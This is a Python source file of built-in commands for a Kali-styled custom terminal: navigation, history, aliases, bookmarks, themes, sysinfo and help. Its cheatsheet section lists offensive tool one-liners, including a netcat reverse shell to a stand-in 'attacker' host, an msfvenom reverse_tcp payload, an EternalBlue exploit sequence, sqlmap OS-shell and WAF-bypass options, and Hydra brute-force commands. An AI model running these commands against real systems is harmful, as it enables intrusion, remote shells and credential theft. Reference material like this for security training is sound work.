"""
commands/builtins.py — Core built-in commands for KaliTerminal v2.

Commands:
  cd, ls, pwd, cat, mkdir, rm, cp, mv, touch, clear, history,
  help, theme, theme-list, alias, bookmark, cheatsheet, sysinfo,
  neofetch, banner, set (-> terminal.py)
"""

import os
import sys
import shutil
import platform
import subprocess
import socket
from datetime import datetime

from ui.theme   import Colors, set_theme, get_theme
from ui.themes  import THEMES
from utils.config import (
    save_prefs, get_pref, set_pref,
    load_aliases, save_aliases,
    load_bookmarks, save_bookmarks,
)

C = Colors


# ══════════════════════════════════════════════════════════════════════════════
#  cd
# ══════════════════════════════════════════════════════════════════════════════

def cmd_cd(args: list, state: dict) -> int:
    cwd = state["cwd"]

    if not args or args[0] == "~":
        target = os.path.expanduser("~")
    elif args[0] == "-":
        target = state.get("prev_dir", cwd)
    else:
        target = os.path.expanduser(args[0])
        if not os.path.isabs(target):
            target = os.path.join(cwd, target)

    target = os.path.normpath(target)

    # ── Bookmarks shortcut: cd @name ──────────────────────────────────────
    if args and args[0].startswith("@"):
        bm_name = args[0][1:]
        bm = load_bookmarks()
        if bm_name in bm:
            target = bm[bm_name]
        else:
            print(C.error(f"Bookmark '{bm_name}' not found. Use: bookmark add {bm_name}"))
            return 1

    try:
        os.chdir(target)
        state["prev_dir"] = cwd
        state["cwd"]      = target
        return 0
    except FileNotFoundError:
        print(C.error(f"cd: no such file or directory: {args[0] if args else '~'}"))
        return 1
    except PermissionError:
        print(C.error(f"cd: permission denied: {args[0]}"))
        return 1
    except NotADirectoryError:
        print(C.error(f"cd: not a directory: {args[0]}"))
        return 1


# ══════════════════════════════════════════════════════════════════════════════
#  pwd
# ══════════════════════════════════════════════════════════════════════════════

def cmd_pwd(args: list, state: dict) -> int:
    print(state["cwd"])
    return 0


# ══════════════════════════════════════════════════════════════════════════════
#  clear
# ══════════════════════════════════════════════════════════════════════════════

def cmd_clear(args: list, state: dict) -> int:
    os.system("clear")
    return 0


# ══════════════════════════════════════════════════════════════════════════════
#  history
# ══════════════════════════════════════════════════════════════════════════════

def cmd_history(args: list, state: dict) -> int:
    hist = state.get("history", [])

    if args and args[0] == "clear":
        state["history"] = []
        # Clear file too
        hist_file = os.path.expanduser("~/.kali_v2_history")
        try:
            open(hist_file, "w").close()
        except Exception:
            pass
        print(C.success("History cleared."))
        return 0

    if args and args[0] == "search" and len(args) > 1:
        term = " ".join(args[1:])
        matches = [(i, h) for i, h in enumerate(hist, 1) if term in h]
        if not matches:
            print(C.info(f"No history matches for '{term}'"))
            return 0
        print(C.header(f"History — search: '{term}'"))
        for n, h in matches[-30:]:
            print(f"  {C.GRAY}{n:>4}{C.RESET}  {C.WHITE}{h}{C.RESET}")
        return 0

    print(C.header(f"Command History ({len(hist)} entries)"))
    start = max(0, len(hist) - 50)
    for i, h in enumerate(hist[start:], start + 1):
        print(f"  {C.GRAY}{i:>4}{C.RESET}  {C.WHITE}{h}{C.RESET}")
    return 0


# ══════════════════════════════════════════════════════════════════════════════
#  banner / neofetch / sysinfo
# ══════════════════════════════════════════════════════════════════════════════

def cmd_banner(args: list, state: dict) -> int:
    from ui.banner import print_banner
    print_banner(fast=True)
    return 0


def cmd_sysinfo(args: list, state: dict) -> int:
    """Detailed system information."""
    try:
        import psutil
        has_psutil = True
    except ImportError:
        has_psutil = False

    print(C.header("System Information", 70))

    def row(label, value, color=None):
        vc = color or C.WHITE
        print(f"  {C.CYAN}{label:<20}{C.RESET}: {vc}{value}{C.RESET}")

    row("Hostname",   socket.gethostname(), C.GREEN)
    row("User",       os.environ.get("USER", "root"), C.RED)
    row("OS",         f"{platform.system()} {platform.release()}")
    row("Kernel",     platform.version()[:60])
    row("Arch",       platform.machine(), C.YELLOW)
    row("Python",     platform.python_version(), C.GREEN)
    row("Shell",      "KaliTerminal v2.0 MASTERPIECE", C.CYAN)
    row("Date",       datetime.now().strftime("%a %d %b %Y %H:%M:%S"), C.YELLOW)

    if has_psutil:
        vm   = psutil.virtual_memory()
        disk = psutil.disk_usage("/")
        row("CPU Cores",  f"{psutil.cpu_count(logical=False)}P / {psutil.cpu_count()}L")
        row("CPU Usage",  f"{psutil.cpu_percent(interval=0.2):.1f}%")
        row("RAM",        f"{vm.used//(1024**2)} MB / {vm.total//(1024**2)} MB ({vm.percent}%)")
        row("Disk (/)",   f"{disk.used//(1024**3)} GB / {disk.total//(1024**3)} GB ({disk.percent}%)")
        row("Uptime",     _uptime())
        row("Boot Time",  datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S"))

    # Try CPU model
    try:
        with open("/proc/cpuinfo") as f:
            for line in f:
                if "model name" in line:
                    row("CPU Model", line.split(":")[1].strip()[:55])
                    break
    except Exception:
        pass

    print()
    return 0


def _uptime() -> str:
    try:
        import psutil, time
        secs = int(time.time() - psutil.boot_time())
        h, r = divmod(secs, 3600)
        m, s = divmod(r, 60)
        return f"{h}h {m}m {s}s"
    except Exception:
        return "N/A"


# ══════════════════════════════════════════════════════════════════════════════
#  theme / theme-list
# ══════════════════════════════════════════════════════════════════════════════

def cmd_theme(args: list, state: dict) -> int:
    """theme <name> — switch color theme."""
    if not args:
        print(C.info(f"Current theme: {C.BOLD}{get_theme()}{C.RESET}"))
        print(C.info("Usage: theme <name>  |  theme-list to see all"))
        return 0

    name = args[0].lower()
    try:
        set_theme(name)
        set_pref("theme", name)
        state.setdefault("prefs", {})["theme"] = name
        print(C.success(f"Theme switched to '{name}'. Changes take effect immediately."))
        return 0
    except ValueError as e:
        print(C.error(str(e)))
        return 1


def cmd_theme_list(args: list, state: dict) -> int:
    """theme-list — show all available themes."""
    cur = get_theme()
    print(C.header("Available Themes"))
    for name, data in THEMES.items():
        marker = f" {C.GREEN}← active{C.RESET}" if name == cur else ""
        print(f"  {C.CYAN}{name:<14}{C.RESET}  {C.GRAY}{data['desc']}{C.RESET}{marker}")
    print(f"\n  Usage: {C.CYAN}theme <name>{C.RESET}\n")
    return 0


# ══════════════════════════════════════════════════════════════════════════════
#  alias
# ══════════════════════════════════════════════════════════════════════════════

def cmd_alias(args: list, state: dict) -> int:
    """
    alias                        — list all aliases
    alias <name>=<command>       — create alias
    alias add <name> <command>   — create alias (verbose form)
    alias remove <name>          — delete alias
    """
    aliases = state.get("aliases", {})

    if not args or args[0] == "list":
        if not aliases:
            print(C.info("No aliases defined. Use: alias <name>=<cmd>"))
            return 0
        print(C.header(f"Aliases ({len(aliases)})"))
        for name, cmd in sorted(aliases.items()):
            print(f"  {C.CYAN}{name:<20}{C.RESET}= {C.GREEN}{cmd}{C.RESET}")
        return 0

    if args[0] == "remove" and len(args) > 1:
        name = args[1]
        if name in aliases:
            del aliases[name]
            save_aliases(aliases)
            state["aliases"] = aliases
            print(C.success(f"Alias '{name}' removed."))
        else:
            print(C.warn(f"Alias '{name}' not found."))
        return 0

    if args[0] == "add" and len(args) >= 3:
        name = args[1]
        cmd  = " ".join(args[2:])
        aliases[name] = cmd
        save_aliases(aliases)
        state["aliases"] = aliases
        print(C.success(f"Alias created: {name} = '{cmd}'"))
        return 0

    # alias name=command form
    raw = " ".join(args)
    if "=" in raw:
        name, _, cmd = raw.partition("=")
        name = name.strip()
        cmd  = cmd.strip().strip("'\"")
        aliases[name] = cmd
        save_aliases(aliases)
        state["aliases"] = aliases
        print(C.success(f"Alias: {name} = '{cmd}'"))
        return 0

    print(C.error("Usage: alias <name>=<command>  |  alias add <name> <cmd>  |  alias remove <name>"))
    return 1


# ══════════════════════════════════════════════════════════════════════════════
#  bookmark
# ══════════════════════════════════════════════════════════════════════════════

def cmd_bookmark(args: list, state: dict) -> int:
    """
    bookmark add <name> [path]  — save directory bookmark
    bookmark go <name>          — jump to bookmark (same as cd @name)
    bookmark list               — show all bookmarks
    bookmark remove <name>      — delete bookmark
    """
    bm = state.get("bookmarks", {})

    if not args or args[0] == "list":
        if not bm:
            print(C.info("No bookmarks. Use: bookmark add <name>"))
            return 0
        print(C.header(f"Bookmarks ({len(bm)})"))
        for name, path in sorted(bm.items()):
            exists = "✔" if os.path.isdir(path) else "✗"
            color  = C.GREEN if exists == "✔" else C.RED
            print(f"  {C.CYAN}@{name:<16}{C.RESET}  {color}{exists}{C.RESET}  {C.WHITE}{path}{C.RESET}")
        print(f"\n  Usage: {C.CYAN}cd @<name>{C.RESET}  or  {C.CYAN}bookmark go <name>{C.RESET}\n")
        return 0

    if args[0] == "add":
        name = args[1] if len(args) > 1 else os.path.basename(state["cwd"])
        path = args[2] if len(args) > 2 else state["cwd"]
        bm[name] = path
        save_bookmarks(bm)
        state["bookmarks"] = bm
        print(C.success(f"Bookmark '@{name}' → {path}"))
        return 0

    if args[0] == "go" and len(args) > 1:
        name = args[1]
        if name in bm:
            return cmd_cd([bm[name]], state)
        print(C.error(f"Bookmark '@{name}' not found."))
        return 1

    if args[0] == "remove" and len(args) > 1:
        name = args[1]
        if name in bm:
            del bm[name]
            save_bookmarks(bm)
            state["bookmarks"] = bm
            print(C.success(f"Bookmark '@{name}' removed."))
        else:
            print(C.warn(f"Bookmark '@{name}' not found."))
        return 0

    print(C.error("Usage: bookmark [add|go|list|remove] [name] [path]"))
    return 1


# ══════════════════════════════════════════════════════════════════════════════
#  help
# ══════════════════════════════════════════════════════════════════════════════

HELP_TEXT = {
    "Navigation": [
        ("cd <path>",          "Change directory  (cd - for prev, cd @name for bookmark)"),
        ("pwd",                "Print working directory"),
        ("ls / ll / la",       "List files (system command, passed through)"),
        ("tree",               "Directory tree (system command)"),
        ("bookmark add <n>",   "Save current dir as bookmark"),
        ("bookmark go <n>",    "Jump to bookmark"),
    ],
    "Session": [
        ("history",            "Show command history (history clear | history search <term>)"),
        ("alias <n>=<cmd>",    "Create command alias"),
        ("export VAR=val",     "Set environment variable"),
        ("source <file>",      "Execute script in current session"),
        ("set <key> <val>",    "Change terminal preference"),
        ("banner",             "Redisplay boot banner"),
        ("sysinfo",            "Full system information"),
        ("exit / quit",        "Exit terminal"),
    ],
    "Themes": [
        ("theme <name>",       "Switch theme (kali|matrix|cyberpunk|dracula|midnight|blood|ocean)"),
        ("theme-list",         "Show all themes"),
    ],
    "Network Tools": [
        ("port-scan <host>",   "TCP port scanner with service detection"),
        ("dns-lookup <host>",  "DNS lookup (A/AAAA/MX/NS/TXT/CNAME)"),
        ("whois <domain>",     "WHOIS domain lookup"),
        ("ip-info [host]",     "Network interfaces & IP info"),
        ("ip-geo <ip>",        "IP geolocation lookup"),
        ("ssl-check <host>",   "SSL/TLS certificate inspector"),
        ("http-headers <url>", "HTTP response headers analyzer"),
        ("netstat-enhanced",   "Enhanced network statistics"),
    ],
    "Crypto & Encoding": [
        ("hash <file>",        "File hash (md5/sha1/sha256/sha512/sha3_256/all)"),
        ("hash-text <text>",   "Hash a string directly"),
        ("encode <text>",      "Encode (base64/url/hex/binary/rot13)"),
        ("decode <text>",      "Decode (base64/url/hex/binary/rot13)"),
        ("jwt-decode <token>", "Decode & inspect JWT token"),
    ],
    "Security Tools": [
        ("password-gen",       "Generate secure passwords  (-l length -c count --pin --phrase)"),
        ("password-audit <pw>","Audit password strength & estimated crack time"),
        ("vuln-search <term>", "Search CVE database for vulnerabilities"),
        ("cheatsheet [tool]",  "Security tool quick-reference (nmap|sqlmap|hydra|john|…)"),
    ],
    "System Tools": [
        ("disk-usage [path]",  "Visual disk usage analyzer"),
        ("proc-monitor",       "Process monitor (top|search|kill|tree)"),
    ],
    "Productivity": [
        ("note add <text>",    "Add a quick note"),
        ("note list",          "Show all notes"),
        ("todo add <task>",    "Add to-do item"),
        ("todo list",          "Show todo list"),
        ("calc <expr>",        "Calculator (e.g. calc 2**32 / 1024)"),
        ("timer start",        "Start a stopwatch timer"),
    ],
    "AI Assistant": [
        ("ai on",              "Enable AI features"),
        ("ai off",             "Disable AI features"),
        ("ai mode local",      "Use local Ollama (100% offline, free)"),
        ("ai mode cloud",      "Use cloud AI provider (needs API key)"),
        ("ai setup",           "Interactive AI setup wizard"),
        ("ai <question>",      "Ask the AI anything (when enabled)"),
        ("ai explain <cmd>",   "Explain a command or concept"),
        ("ai code <task>",     "Generate code"),
        ("ai ctf <desc>",      "CTF challenge hints"),
        ("ai models",          "List available AI models"),
        ("ai status",          "Show current AI configuration"),
    ],
}


def cmd_help(args: list, state: dict) -> int:
    if args:
        # Specific command help
        query = " ".join(args).lower()
        for section, cmds in HELP_TEXT.items():
            for cmd_name, desc in cmds:
                if query in cmd_name.lower():
                    print(f"\n  {C.CYAN}{C.BOLD}{cmd_name}{C.RESET}")
                    print(f"  {C.WHITE}{desc}{C.RESET}\n")
                    return 0
        print(C.warn(f"No help found for '{query}'"))
        return 1

    print(f"\n{C.BLUE}{'═'*70}{C.RESET}")
    print(f"  {C.BOLD}{C.RED}KALITERMINAL v2 — MASTERPIECE{C.RESET}  {C.GRAY}Full Command Reference{C.RESET}")
    print(f"{C.BLUE}{'═'*70}{C.RESET}\n")

    for section, cmds in HELP_TEXT.items():
        print(f"  {C.BOLD}{C.YELLOW}── {section} {'─'*(40-len(section))}{C.RESET}")
        for cmd_name, desc in cmds:
            print(f"    {C.CYAN}{cmd_name:<28}{C.RESET}  {C.GRAY}{desc}{C.RESET}")
        print()

    print(f"  {C.GRAY}Tip: Any Linux command (nmap, curl, git, python3…) works as normal.{C.RESET}")
    print(f"  {C.GRAY}Pipe |, redirect >, >>, <, background &, chains ; && || all work.{C.RESET}\n")
    print(f"{C.BLUE}{'═'*70}{C.RESET}\n")
    return 0


# ══════════════════════════════════════════════════════════════════════════════
#  cheatsheet
# ══════════════════════════════════════════════════════════════════════════════

CHEATSHEETS = {
    "nmap": [
        ("Quick scan",         "nmap -sV -T4 <target>"),
        ("Full port scan",     "nmap -p- -sV -sC -T4 <target>"),
        ("OS detection",       "nmap -O --osscan-guess <target>"),
        ("UDP scan",           "nmap -sU -p 53,67,161 <target>"),
        ("Vuln script",        "nmap --script vuln <target>"),
        ("Stealth SYN",        "nmap -sS <target>"),
        ("Aggressive",         "nmap -A -T4 <target>"),
        ("Output to file",     "nmap -oN scan.txt -oX scan.xml <target>"),
        ("Script categories",  "nmap --script=default,safe,discovery <target>"),
        ("Ping sweep",         "nmap -sn 192.168.1.0/24"),
    ],
    "sqlmap": [
        ("Basic test",         "sqlmap -u 'http://site.com/page?id=1'"),
        ("POST request",       "sqlmap -u URL --data='user=a&pass=b'"),
        ("List databases",     "sqlmap -u URL --dbs"),
        ("List tables",        "sqlmap -u URL -D dbname --tables"),
        ("Dump table",         "sqlmap -u URL -D db -T users --dump"),
        ("OS shell",           "sqlmap -u URL --os-shell"),
        ("Burp request",       "sqlmap -r request.txt"),
        ("Level/Risk",         "sqlmap -u URL --level=5 --risk=3"),
        ("Bypass WAF",         "sqlmap -u URL --tamper=space2comment"),
        ("Batch mode",         "sqlmap -u URL --batch --random-agent"),
    ],
    "hydra": [
        ("SSH brute",          "hydra -l user -P wordlist.txt ssh://target"),
        ("FTP brute",          "hydra -l admin -P pass.txt ftp://target"),
        ("HTTP POST",          "hydra -l user -P pass.txt target http-post-form '/login:u=^USER^&p=^PASS^:F=wrong'"),
        ("Multiple users",     "hydra -L users.txt -P pass.txt ssh://target"),
        ("RDP",                "hydra -l admin -P pass.txt rdp://target"),
        ("Verbose",            "hydra -v -l user -P pass.txt target ssh"),
        ("Restore",            "hydra -R"),
    ],
    "john": [
        ("Basic crack",        "john hashes.txt"),
        ("With wordlist",      "john --wordlist=rockyou.txt hashes.txt"),
        ("MD5 format",         "john --format=raw-md5 hashes.txt"),
        ("Show cracked",       "john --show hashes.txt"),
        ("Rules",              "john --rules --wordlist=wordlist.txt hashes.txt"),
        ("Single mode",        "john --single hashes.txt"),
        ("Session",            "john --session=mysession hashes.txt"),
    ],
    "hashcat": [
        ("MD5 dictionary",     "hashcat -m 0 hash.txt rockyou.txt"),
        ("SHA256",             "hashcat -m 1400 hash.txt wordlist.txt"),
        ("NTLM",               "hashcat -m 1000 hash.txt wordlist.txt"),
        ("Brute force 8chr",   "hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a?a?a"),
        ("Rule-based",         "hashcat -m 0 hash.txt wordlist.txt -r rules/best64.rule"),
        ("Show cracked",       "hashcat -m 0 hash.txt --show"),
        ("Benchmark",          "hashcat -b"),
    ],
    "metasploit": [
        ("Start msfconsole",   "msfconsole"),
        ("Search exploit",     "search type:exploit name:eternalblue"),
        ("Use module",         "use exploit/windows/smb/ms17_010_eternalblue"),
        ("Set options",        "set RHOSTS 192.168.1.100"),
        ("Set payload",        "set payload windows/x64/meterpreter/reverse_tcp"),
        ("Run exploit",        "run  OR  exploit"),
        ("Background session", "background"),
        ("List sessions",      "sessions -l"),
        ("Interact session",   "sessions -i 1"),
        ("Generate payload",   "msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe > shell.exe"),
    ],
    "gobuster": [
        ("Dir scan",           "gobuster dir -u http://target -w wordlist.txt"),
        ("DNS brute",          "gobuster dns -d domain.com -w subdomains.txt"),
        ("With extensions",    "gobuster dir -u http://target -w words.txt -x php,html,txt"),
        ("Status codes",       "gobuster dir -u http://target -w words.txt -s 200,301,302"),
        ("Threads",            "gobuster dir -u http://target -w words.txt -t 50"),
    ],
    "curl": [
        ("GET request",        "curl http://target"),
        ("POST JSON",          "curl -X POST -H 'Content-Type: application/json' -d '{\"key\":\"val\"}' URL"),
        ("Headers only",       "curl -I http://target"),
        ("Follow redirects",   "curl -L http://target"),
        ("With cookies",       "curl -b 'session=abc123' http://target"),
        ("Upload file",        "curl -F 'file=@local.txt' http://target/upload"),
        ("Basic auth",         "curl -u user:password http://target"),
        ("Proxy",              "curl --proxy http://127.0.0.1:8080 http://target"),
    ],
    "netcat": [
        ("Listen",             "nc -lvnp 4444"),
        ("Connect",            "nc target 4444"),
        ("Reverse shell",      "nc -e /bin/bash attacker 4444"),
        ("File transfer send", "nc -lvnp 4444 < file.txt"),
        ("File transfer recv", "nc target 4444 > file.txt"),
        ("Port scan",          "nc -zv target 20-100"),
        ("Banner grab",        "nc target 80  then: GET / HTTP/1.0"),
    ],
    "burp": [
        ("Intercept proxy",    "Set browser proxy to 127.0.0.1:8080"),
        ("Scope target",       "Target → Scope → Add URL"),
        ("Repeater",           "Ctrl+R to send request to Repeater"),
        ("Intruder",           "Ctrl+I — mark positions with §§"),
        ("Scanner",            "Right-click request → Scan"),
        ("Decoder",            "Decoder tab — Smart decode any encoded data"),
        ("Comparer",           "Compare two requests/responses side-by-side"),
    ],
    "wireshark": [
        ("HTTP traffic",       "http"),
        ("Specific IP",        "ip.addr == 192.168.1.100"),
        ("TCP port",           "tcp.port == 443"),
        ("Find credentials",   "http contains 'password'  OR  ftp"),
        ("Follow TCP stream",  "Right-click packet → Follow → TCP Stream"),
        ("Export objects",     "File → Export Objects → HTTP"),
        ("DNS queries",        "dns"),
        ("ARP packets",        "arp"),
    ],
}


def cmd_cheatsheet(args: list, state: dict) -> int:
    """cheatsheet [tool] — security tool quick-reference."""
    if not args:
        print(C.header("Security Cheat Sheets"))
        for tool in sorted(CHEATSHEETS.keys()):
            count = len(CHEATSHEETS[tool])
            print(f"  {C.CYAN}{tool:<16}{C.RESET}  {C.GRAY}{count} examples{C.RESET}")
        print(f"\n  Usage: {C.CYAN}cheatsheet <tool>{C.RESET}\n")
        return 0

    tool = args[0].lower()
    if tool not in CHEATSHEETS:
        print(C.error(f"No cheatsheet for '{tool}'. Available: {', '.join(sorted(CHEATSHEETS))}"))
        return 1

    print(C.header(f"{tool.upper()} Cheat Sheet", 70))
    entries = CHEATSHEETS[tool]
    for label, cmd in entries:
        print(f"  {C.YELLOW}{label:<28}{C.RESET}  {C.CYAN}{cmd}{C.RESET}")
    print()
    return 0


# ══════════════════════════════════════════════════════════════════════════════
#  BUILTINS registry
# ══════════════════════════════════════════════════════════════════════════════

BUILTINS: dict = {
    "cd":           cmd_cd,
    "pwd":          cmd_pwd,
    "clear":        cmd_clear,
    "cls":          cmd_clear,
    "history":      cmd_history,
    "banner":       cmd_banner,
    "sysinfo":      cmd_sysinfo,
    "neofetch":     cmd_sysinfo,
    "theme":        cmd_theme,
    "theme-list":   cmd_theme_list,
    "alias":        cmd_alias,
    "bookmark":     cmd_bookmark,
    "help":         cmd_help,
    "?":            cmd_help,
    "cheatsheet":   cmd_cheatsheet,
    "cs":           cmd_cheatsheet,
}
